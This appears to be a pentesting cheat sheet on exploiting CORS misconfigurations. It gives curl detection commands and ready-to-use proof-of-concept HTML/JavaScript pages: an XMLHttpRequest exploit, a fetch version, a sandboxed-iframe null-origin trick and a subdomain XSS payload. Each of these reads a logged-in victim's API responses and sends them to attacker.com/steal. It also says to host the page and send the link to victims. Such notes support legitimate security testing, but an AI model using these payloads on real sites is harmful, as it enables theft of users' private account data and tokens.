# CORS Misconfiguration

Cross-Origin Resource Sharing — browser mechanism controlling which origins can read responses from cross-origin requests. Misconfigs allow attacker-controlled origins to read authenticated API responses.

> [!note]
> CORS is enforced by the **browser only** — curl/Burp ignore it. CORS bugs require a victim to visit the attacker's page while authenticated to the target.

---

## How CORS Works

```
Browser sends:    Origin: https://attacker.com
Server responds:  Access-Control-Allow-Origin: https://attacker.com
                  Access-Control-Allow-Credentials: true

→ Browser allows attacker.com JS to read the response
```

Without `Access-Control-Allow-Credentials: true`, cookies are not sent — the response is cross-origin but unauthenticated.

---

## Detection

```bash
# Test 1: Reflect arbitrary origin
curl -s -I "https://<target>/api/profile" -H "Origin: https://evil.com" -H "Cookie: session=<valid-session>"
# Look for: Access-Control-Allow-Origin: https://evil.com
# AND:       Access-Control-Allow-Credentials: true

# Test 2: Null origin
curl -s -I "https://<target>/api/profile" -H "Origin: null" -H "Cookie: session=<valid-session>"
# Look for: Access-Control-Allow-Origin: null

# Test 3: Prefix/suffix match bypass
curl -s -I "https://<target>/api/profile" -H "Origin: https://evil-target.com" -H "Cookie: session=<valid-session>"
# If ACAO: https://evil-target.com → ends-with check bypass

curl -s -I "https://<target>/api/profile" -H "Origin: https://target.com.evil.com" -H "Cookie: session=<valid-session>"
# If ACAO: https://target.com.evil.com → prefix check bypass

# Test 4: Subdomain trust
curl -s -I "https://<target>/api/profile" -H "Origin: https://subdomain.target.com" -H "Cookie: session=<valid-session>"
# If ACAO: https://subdomain.target.com → find XSS on any subdomain

# Test 5: HTTP downgrade
curl -s -I "https://<target>/api/profile" -H "Origin: http://target.com" -H "Cookie: session=<valid-session>"

# Test 6: Preflighted check (non-simple requests)
curl -s -I "https://<target>/api/admin" -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Headers: Authorization"
# Look for: Access-Control-Allow-Methods, Access-Control-Allow-Headers
```

---

## Vulnerability Classes

### 1. Wildcard with Credentials

```bash
# Server responds: ACAO: *  AND  ACAC: true
# Actually invalid per spec — but some frameworks mishandle this
curl -si "https://<target>/api/data" -H "Origin: https://evil.com" | grep -i "access-control"
# If ACAO: * → wildcard (no credentials sent)
# If ACAO: * + ACAC: true → misconfig (browser blocks per spec, but check anyway)
```

### 2. Origin Reflected Verbatim

```bash
# Server echoes back whatever Origin header is sent
curl -si "https://<target>/api/profile" -H "Origin: https://evil.com" -b "session=<cookie>" | grep -i "access-control"
# ACAO: https://evil.com + ACAC: true → fully exploitable
```

### 3. Null Origin Trusted

```bash
curl -si "https://<target>/api/profile" -H "Origin: null" -b "session=<cookie>" | grep -i "access-control"
# ACAO: null + ACAC: true → sandbox iframe exploit (see below)
```

### 4. Regex Bypass — Suffix Match

```bash
# Server checks if origin ends with "target.com"
# Bypass: register a domain ending in target.com
curl -si "https://<target>/api/profile" -H "Origin: https://eviltarget.com" -b "session=<cookie>" | grep -i "access-control"
# OR: https://notatarget.com
```

### 5. Subdomain Trust + XSS

```bash
# Server trusts *.target.com
# Find XSS on any subdomain → exfil from main domain
# Test all subdomains found in recon for reflected/stored XSS
```

---

## Exploitation PoC

### Basic Reflected Origin Exploit

```html
<!-- Host on attacker.com, send link to victim -->
<!DOCTYPE html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/profile', true);
xhr.withCredentials = true;   // send victim's cookies
xhr.onload = function() {
  // Send stolen data to attacker server
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(this.responseText));
};
xhr.send();
</script>
</body>
</html>
```

```bash
# Serve the PoC
python3 -m http.server 8080
# Victim visits: http://<attacker-ip>:8080/cors.html while logged into target
```

### Null Origin (Sandboxed iframe)

```html
<!-- null origin bypass — use sandboxed iframe -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','https://target.com/api/profile',true);
xhr.withCredentials=true;
xhr.onload=function(){
  top.location='https://attacker.com/steal?'+encodeURIComponent(this.responseText);
};
xhr.send();
</script>"></iframe>
```

### Fetch API Version (Modern)

```html
<script>
fetch('https://target.com/api/profile', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: data
  });
});
</script>
```

### Subdomain XSS → CORS Exfil

```javascript
// XSS payload on xss.target.com:
// Since origin is https://xss.target.com (trusted subdomain), CORS passes
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/admin', true);
xhr.withCredentials = true;
xhr.onload = function() {
  new Image().src = 'https://attacker.com/steal?d=' + encodeURIComponent(this.responseText);
};
xhr.send();
```

---

## CORS + Sensitive Endpoints

```bash
# Test CORS on high-value endpoints:
for endpoint in /api/profile /api/user /api/keys /api/tokens /api/admin /api/credentials /api/export; do
  echo -n "$endpoint: "
  curl -si "https://<target>$endpoint" -H "Origin: https://evil.com" -b "session=<cookie>" 2>/dev/null | grep -i "access-control-allow-origin" || echo "no CORS header"
done
```

---

## Burp Suite Testing

1. Proxy → HTTP History → find authenticated API request
2. Send to Repeater
3. Add `Origin: https://evil.com` header
4. Check response for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`
5. Burp Scanner → Active scan → checks for CORS issues automatically (Pro)

---

## Quick Reference

| Config | Credentials Sent | Exploitable |
|--------|-----------------|-------------|
| `ACAO: *` | No (browser blocks) | Read unauth responses only |
| `ACAO: *` + `ACAC: true` | Spec violation — browser blocks | Not exploitable |
| `ACAO: <origin>` + `ACAC: true` | Yes | **Fully exploitable** |
| `ACAO: null` + `ACAC: true` | Yes (via sandbox) | Exploitable |
| `ACAO: *.target.com` | Yes (subdomain) | Exploitable if XSS on subdomain |

```bash
# One-liner check
curl -si "https://<target>/api/profile" -H "Origin: https://evil.com" -b "session=<cookie>" | grep -Ei "access-control-(allow-origin|allow-credentials)"
# Both headers present with arbitrary origin → exploitable
```
